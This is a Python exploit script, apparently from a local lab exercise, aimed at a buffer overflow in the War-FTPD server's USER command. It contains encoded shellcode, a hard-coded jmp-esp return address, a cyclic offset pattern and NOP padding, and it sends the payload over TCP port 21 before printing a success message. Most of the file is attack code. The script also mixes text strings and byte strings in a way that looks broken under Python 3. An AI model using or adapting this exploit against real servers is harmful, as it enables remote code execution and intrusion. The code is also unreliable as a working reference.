#coding=UTF-8
#挂起  cdb -pn war-ftpd.exe

import socket,sys
from string import ascii_uppercase,ascii_lowercase,digits
import itertools

def send_buf(buffer,host='127.0.0.1',port=21):
  try:
      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect((host,int(port)))
      data = b'USER ' + buffer + b'\r\n'
      s.send(data)
      s.recv(1000)
      print("[SUCCESS] - WarFTPD EXPLOITED :)")
  except socket.error:
    print("[ERROR] Unable to connect to host :(")
    sys.exit(0)
  except IndexError:
    print("Use: "+sys.argv[0]+" host port")



buf = ""
buf += "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30" 
buf += "\x42\x36\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42" 
buf += "\x30\x41\x44\x41\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x34" 
buf += "\x4e\x33\x4b\x38\x4e\x37\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x31\x4b\x38\x4f\x45\x42\x52\x41\x30\x4b\x4e" 
buf += "\x49\x54\x4b\x38\x46\x53\x4b\x48\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x38\x42\x4c\x46\x47\x47\x30\x41\x4c" 
buf += "\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e\x46\x4f\x4b\x53\x46\x45\x46\x32\x46\x50\x45\x37\x45\x4e\x4b\x48\x4f\x45\x46\x42" 
buf += "\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x44\x4b\x58\x4f\x45\x4e\x41\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x38\x41\x50" 
buf += "\x4b\x4e\x49\x48\x4e\x35\x46\x52\x46\x50\x43\x4c\x41\x33\x42\x4c\x46\x56\x4b\x38\x42\x34\x42\x53\x45\x38\x42\x4c\x4a\x37" 
buf += "\x4e\x50\x4b\x38\x42\x54\x4e\x50\x4b\x48\x42\x37\x4e\x31\x4d\x4a\x4b\x48\x4a\x46\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x48" 
buf += "\x42\x4b\x42\x30\x42\x30\x42\x30\x4b\x38\x4a\x36\x4e\x33\x4f\x55\x41\x53\x48\x4f\x42\x46\x48\x45\x49\x48\x4a\x4f\x43\x58" 
buf += "\x42\x4c\x4b\x37\x42\x55\x4a\x56\x42\x4f\x4c\x58\x46\x30\x4f\x35\x4a\x46\x4a\x49\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f"
buf += "\x47\x4e\x43\x56\x41\x46\x4e\x36\x43\x46\x42\x30\x5a"
shellcode1 = buf

#jmp esp
#retaddr = bytes.fromhex('7ffa4512')[::-1]
#retaddr = "\x7f\xfa\x45\x12"#顺序错了，需要颠倒顺序
retaddr = "\x12\x45\xfa\x7f"
#  pattern.find(bytes.fromhex('68423768')[::-1])

buf1 = ((b"\x90" *485 + retaddr).ljust(493,b"\x90") + shellcode1).ljust(1000,b"\x90")
pattern2 = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
#send_buf("A"*500,'127.0.0.1',21)
#send_buf(pattern2,'127.0.0.1',21)
send_buf(buf1,'127.0.0.1',21)

